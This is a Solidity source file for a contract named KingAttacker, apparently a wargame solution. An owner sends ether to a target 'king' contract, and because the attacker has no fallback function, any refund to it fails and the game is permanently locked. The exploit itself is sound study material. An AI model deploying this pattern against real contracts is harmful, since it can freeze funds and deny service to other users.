// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttacker {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function attackKing(address payable king) public payable onlyOwner {
        king.call{value: msg.value}("");
    }
}
